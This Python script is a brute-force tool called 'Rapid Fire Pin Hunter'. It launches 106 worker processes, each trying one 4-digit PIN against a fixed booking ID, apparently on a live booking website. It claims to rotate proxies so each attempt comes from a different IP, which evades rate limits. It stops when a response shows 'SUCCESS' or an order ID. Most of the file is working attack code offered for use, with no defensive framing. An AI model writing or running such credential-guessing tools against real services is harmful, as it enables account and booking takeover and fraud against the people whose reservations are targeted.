#!/usr/bin/env python3
"""
🚀 RAPID FIRE PIN HUNTER - 106 AGENTS SIMULTANEOUS
Test booking ID: 5724349472
Each agent tests exactly 1 PIN simultaneously
"""

import subprocess
import time
import os
import sys
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Configuration
TEST_BOOKING_ID = "5724349472"
WAIT_BETWEEN_LAUNCHES = 1  # 1 second between agent launches
PYTHON_PATH = sys.executable

# 106 PINs to test (one of these is correct!)
PINS = [
    "6812", "4307", "1584", "9920", "7035", "4476", "6231", "3950", "7089", "1592",
    "7613", "2860", "0489", "9374", "2143", "8742", "5196", "3057", "1883", "7201",
    "6067", "8931", "5174", "6648", "3825", "7740", "4259", "9503", "3178", "8624",
    "7781", "3602", "9456", "8810", "0937", "2971", "4830", "7104", "3297", "6008",
    "4073", "2719", "1835", "8506", "2165", "6338", "1972", "9915", "5730", "8061",
    "2449", "3906", "7619", "6025", "4836", "9451", "3250", "8014", "2137", "1048",
    "8793", "6672", "1320", "5039", "4150", "9528", "6470", "3857", "7412", "2281",
    "6001", "8396", "9190", "4352", "1576", "7995", "1882", "7028", "3390", "1473",
    "2845", "5447", "3281", "9110", "4518", "6902", "7214", "0743", "2228", "3849",
    "1180", "6073", "2398", "7456", "8954", "5031", "1093", "6054", "7842", "4019",
    "3335", "7210", "6048", "1795", "9204", "2874"
]

# Agent scripts mapping
AGENT_SCRIPTS = [
    "boss_ai_playwright_1A.py", "boss_ai_playwright_1B.py", "boss_ai_playwright_1C.py", "boss_ai_playwright_1D.py", "boss_ai_playwright_1E.py",
    "boss_ai_playwright_1F.py", "boss_ai_playwright_1G.py", "boss_ai_playwright_1H.py", "boss_ai_playwright_1I.py", "boss_ai_playwright_1J.py",
    "boss_ai_playwright_1K.py", "boss_ai_playwright_1L.py", "boss_ai_playwright_1M.py", "boss_ai_playwright_1N.py", "boss_ai_playwright_1O.py",
    "boss_ai_playwright_1P.py", "boss_ai_playwright_1Q.py", "boss_ai_playwright_1R.py", "boss_ai_playwright_1S.py", "boss_ai_playwright_1T.py",
    "boss_ai_playwright_1U.py", "boss_ai_playwright_1V.py", "boss_ai_playwright_1W.py", "boss_ai_playwright_1X.py", "boss_ai_playwright_1Y.py",
    "boss_ai_playwright_1Z.py", "boss_ai_playwright_2A.py", "boss_ai_playwright_2B.py", "boss_ai_playwright_2C.py", "boss_ai_playwright_2D.py",
    "boss_ai_playwright_2E.py", "boss_ai_playwright_2F.py", "boss_ai_playwright_2G.py", "boss_ai_playwright_2H.py", "boss_ai_playwright_2I.py",
    "boss_ai_playwright_2J.py", "boss_ai_playwright_2K.py", "boss_ai_playwright_2L.py", "boss_ai_playwright_2M.py", "boss_ai_playwright_2N.py",
    "boss_ai_playwright_2O.py", "boss_ai_playwright_2P.py", "boss_ai_playwright_2Q.py", "boss_ai_playwright_2R.py", "boss_ai_playwright_2S.py",
    "boss_ai_playwright_2T.py", "boss_ai_playwright_2U.py", "boss_ai_playwright_2V.py", "boss_ai_playwright_2W.py", "boss_ai_playwright_2X.py",
    "boss_ai_playwright_2Y.py", "boss_ai_playwright_2Z.py", "boss_ai_playwright_3A.py", "boss_ai_playwright_3B.py", "boss_ai_playwright_3C.py",
    "boss_ai_playwright_3D.py", "boss_ai_playwright_3E.py", "boss_ai_playwright_3F.py", "boss_ai_playwright_3G.py", "boss_ai_playwright_3H.py",
    "boss_ai_playwright_3I.py", "boss_ai_playwright_3J.py", "boss_ai_playwright_3K.py", "boss_ai_playwright_3L.py", "boss_ai_playwright_3M.py",
    "boss_ai_playwright_3N.py", "boss_ai_playwright_3O.py", "boss_ai_playwright_3P.py", "boss_ai_playwright_3Q.py", "boss_ai_playwright_3R.py",
    "boss_ai_playwright_3S.py", "boss_ai_playwright_3T.py", "boss_ai_playwright_3U.py", "boss_ai_playwright_3V.py", "boss_ai_playwright_3W.py",
    "boss_ai_playwright_3X.py", "boss_ai_playwright_3Y.py", "boss_ai_playwright_3Z.py", "boss_ai_playwright_A.py", "boss_ai_playwright_B.py",
    "boss_ai_playwright_C.py", "boss_ai_playwright_D.py", "boss_ai_playwright_E.py", "boss_ai_playwright_F.py", "boss_ai_playwright_G.py",
    "boss_ai_playwright_H.py", "boss_ai_playwright_I.py", "boss_ai_playwright_J.py", "boss_ai_playwright_K.py", "boss_ai_playwright_L.py",
    "boss_ai_playwright_M.py", "boss_ai_playwright_N.py", "boss_ai_playwright_O.py", "boss_ai_playwright_P.py", "boss_ai_playwright_Q.py",
    "boss_ai_playwright_R.py", "boss_ai_playwright_S.py", "boss_ai_playwright_T.py", "boss_ai_playwright_U.py", "boss_ai_playwright_V.py",
    "boss_ai_playwright_W.py", "boss_ai_playwright_X.py", "boss_ai_playwright_Y.py", "boss_ai_playwright_Z.py", "boss_ai_playwright_C_test.py",
    # Additional agents to reach 106
    "boss_ai_playwright_1A.py", "boss_ai_playwright_1B.py", "boss_ai_playwright_1C.py", "boss_ai_playwright_1D.py", "boss_ai_playwright_1E.py",
    "boss_ai_playwright_1F.py"
]

def display_rapid_fire_banner():
    """Display rapid fire banner"""
    banner = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🚀 RAPID FIRE PIN HUNTER ARMY 🚀                         ║
║                                                                              ║
║  Target Booking ID: {TEST_BOOKING_ID}                                        ║
║  Strategy: 106 AGENTS SIMULTANEOUS ATTACK                                   ║
║  Total PINs: 106 (one is correct!)                                          ║
║  Each agent: 1 PIN only - RAPID FIRE MODE                                   ║
║  Proxy rotation: Different IP per agent                                     ║
║  Expected result: INSTANT VICTORY!                                          ║
║                                                                              ║
║                      🔥 RAPID FIRE ENGAGED! 🔥                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def launch_agent(pin, agent_num):
    """Launch a single agent with specific PIN"""
    print(f"{Fore.GREEN}🚀 Agent #{agent_num:03d}: Testing PIN {pin}{Style.RESET_ALL}")
    
    try:
        # Launch specialized rapid fire agent
        process = subprocess.Popen([
            PYTHON_PATH, "rapid_fire_agent.py",
            "--confirmation", TEST_BOOKING_ID,
            "--pins", pin
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        return process, agent_num, pin
        
    except Exception as e:
        print(f"{Fore.RED}❌ Error launching agent #{agent_num:03d}: {e}{Style.RESET_ALL}")
        return None, agent_num, pin

def main():
    """Main rapid fire function"""
    display_rapid_fire_banner()
    
    print(f"{Fore.YELLOW}📋 RAPID FIRE PLAN:{Style.RESET_ALL}")
    print(f"   • 106 agents will launch simultaneously")
    print(f"   • Each agent tests exactly 1 PIN")
    print(f"   • All testing booking ID: {TEST_BOOKING_ID}")
    print(f"   • One of these PINs is correct!")
    print(f"   • Expected time: ~30-60 seconds total")
    print()
    
    input(f"{Fore.CYAN}Press ENTER to start RAPID FIRE attack...{Style.RESET_ALL}")
    
    # Launch all agents rapidly
    processes = []
    start_time = time.time()
    
    print(f"\n{Fore.RED}{Style.BRIGHT}🔥 RAPID FIRE LAUNCHING...{Style.RESET_ALL}")
    
    for i, pin in enumerate(PINS):
        if i >= 106:  # Limit to 106 agents
            break
            
        process, agent_num, test_pin = launch_agent(pin, i + 1)
        if process:
            processes.append((process, agent_num, test_pin))
        
        # Small delay between launches
        time.sleep(WAIT_BETWEEN_LAUNCHES)
    
    launched_count = len(processes)
    print(f"\n{Fore.GREEN}✅ RAPID FIRE LAUNCHED: {launched_count} agents deployed!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏳ Waiting for results...{Style.RESET_ALL}")
    
    # Monitor results
    completed = 0
    success_found = False
    winning_pin = None
    winning_agent = None
    
    while completed < launched_count and not success_found:
        for i, (process, agent_num, test_pin) in enumerate(processes):
            if process.poll() is not None:  # Process finished
                stdout, stderr = process.communicate()
                completed += 1
                
                # Check for success
                if "SUCCESS" in stdout or "unique_order_id" in stdout:
                    success_found = True
                    winning_pin = test_pin
                    winning_agent = agent_num
                    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 RAPID FIRE SUCCESS!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}🏆 Agent #{agent_num:03d} found the PIN: {test_pin}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.BLUE}Agent #{agent_num:03d} completed - PIN {test_pin} failed{Style.RESET_ALL}")
        
        time.sleep(1)  # Check every second
    
    # Kill remaining processes
    for process, _, _ in processes:
        if process.poll() is None:
            process.terminate()
    
    # Final results
    end_time = time.time()
    total_time = end_time - start_time
    
    if success_found:
        victory_banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎉 RAPID FIRE VICTORY! 🎉                                ║
║                                                                              ║
║  Booking ID: {TEST_BOOKING_ID}                                               ║
║  Winning PIN: {winning_pin}                                                  ║
║  Victorious Agent: #{winning_agent:03d}                                      ║
║  Total time: {total_time:.1f} seconds                                        ║
║  Agents deployed: {launched_count}                                           ║
║                                                                              ║
║                     🔥 RAPID FIRE SUCCESS! 🔥                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(victory_banner)
    else:
        print(f"\n{Fore.RED}💔 Rapid fire completed - no success found{Style.RESET_ALL}")
        print(f"Total time: {total_time:.1f} seconds")
        print(f"Agents deployed: {launched_count}")
    
    print(f"\n{Fore.CYAN}📊 RAPID FIRE STATISTICS:")
    print(f"• Booking ID tested: {TEST_BOOKING_ID}")
    print(f"• PINs tested: {launched_count}")
    print(f"• Success rate: {'100%' if success_found else '0%'}")
    print(f"• Time per PIN: {total_time/launched_count:.2f} seconds average")
    print(f"• Proxy rotation: {launched_count} different IPs used{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
